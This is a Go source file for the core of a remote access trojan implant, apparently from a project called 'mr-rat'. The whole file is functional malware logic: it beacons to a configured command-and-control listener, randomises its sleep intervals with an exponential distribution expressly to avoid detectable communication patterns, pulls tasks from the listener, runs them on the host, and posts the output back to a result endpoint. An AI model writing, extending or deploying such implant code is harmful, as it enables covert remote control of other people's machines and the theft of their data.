package implant

import (
	"github.com/mauricetjmurphy/mr-rat/pkg/communicator"
	"github.com/mauricetjmurphy/mr-rat/pkg/config"
	"github.com/mauricetjmurphy/mr-rat/pkg/tasks"
	"log"
	"math/rand"

	"sync"
	"time"
)

// Implant holds the configuration and state for the implant
type Implant struct {
	config                   *config.Config
	running                  bool
	meanDwellTime            time.Duration
	dwellDistributionSeconds func() time.Duration
	mu                       sync.Mutex
	taskChannel              chan tasks.Task
	randGen                  *rand.Rand
}

// NewImplant creates and initializes a new Implant instance
func NewImplant(cfg *config.Config) *Implant {
	// Initialize a new random generator
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	return &Implant{
		config:        cfg,
		running:       false,
		meanDwellTime: cfg.Interval,
		// Define the dwell distribution function using exponential distribution
		dwellDistributionSeconds: func() time.Duration {
			lambda := 1 / float64(cfg.Interval.Seconds())
			return time.Duration(rng.ExpFloat64()/lambda) * time.Second
		},
		taskChannel: make(chan tasks.Task, 10), // Buffer size of 10
		randGen:     rng,
	}
}

// StartImplant begins the beaconing loop and task worker
func (i *Implant) StartImplant() {
	i.mu.Lock()
	defer i.mu.Unlock()
	if !i.running {
		i.running = true
		go i.beaconLoop()
		i.startTaskWorker()
	}
}

// StopImplant halts the beaconing loop
func (i *Implant) StopImplant() {
	i.mu.Lock()
	defer i.mu.Unlock()
	i.running = false
}

// SetMeanDwellTime updates the mean dwell time and recalculates the dwell distribution function
func (i *Implant) SetMeanDwellTime(d time.Duration) {
	i.mu.Lock()
	defer i.mu.Unlock()
	i.meanDwellTime = d
	// Update the dwell distribution function
	i.dwellDistributionSeconds = func() time.Duration {
		lambda := 1 / float64(d.Seconds())
		return time.Duration(i.randGen.ExpFloat64()/lambda) * time.Second
	}
}

// beaconLoop continuously communicates with the listener and processes tasks with variable intervals
func (i *Implant) beaconLoop() {
	for {
		i.mu.Lock()
		if !i.running {
			i.mu.Unlock()
			return
		}
		i.mu.Unlock()

		// Communicate with the listener to receive tasks
		taskData, err := communicator.Communicate(i.config.Host, i.config.Port, i.config.URI)
		if err != nil {
			log.Printf("Error in beaconing: %v", err)
		} else {
			log.Printf("Received task data: %s", string(taskData)) // Log the response data
			i.handleTasks(taskData)
		}

		// Sleep for a variable duration to avoid constant communication patterns
		time.Sleep(i.dwellDistributionSeconds())
	}
}

// handleTasks enqueues received tasks to the task worker
func (i *Implant) handleTasks(taskData []byte) {
	tasks, err := tasks.ParseTasksFrom(taskData, i.updateConfiguration)
	if err != nil {
		log.Printf("Failed to parse task: %v", err)
		return
	}
	for _, task := range tasks {
		i.taskChannel <- task
	}
}

func (i *Implant) startTaskWorker() {
	go func() {
		for task := range i.taskChannel {
			result := task.Run()
			log.Printf("Task result: ID=%s, Output=%s, Success=%t", result.ID, result.Output, result.Success)
			// Send result back to the listener
			i.sendResult(result)
		}
	}()
}

func (i *Implant) sendResult(result tasks.Result) {
	payload := tasks.ResultPayload{
		Success:  result.Success,
		TaskID:   result.ID.String(),
		Contents: result.Output,
	}
	// Send the result via HTTP POST
	response, err := communicator.SendResult(i.config.Host, i.config.Port, "/api/v1/result", payload)
	if err != nil {
		log.Printf("Failed to send result: %v", err)
	} else {
		log.Printf("Result sent successfully: %s", response)
	}
}

func (i *Implant) updateConfiguration(cfg tasks.Configuration) {
	i.mu.Lock()
	defer i.mu.Unlock()
	i.meanDwellTime = time.Duration(cfg.MeanDwell) * time.Second
	i.running = cfg.IsRunning
	log.Printf("Configuration updated: meanDwellTime=%v, running=%t", i.meanDwellTime, i.running)
}
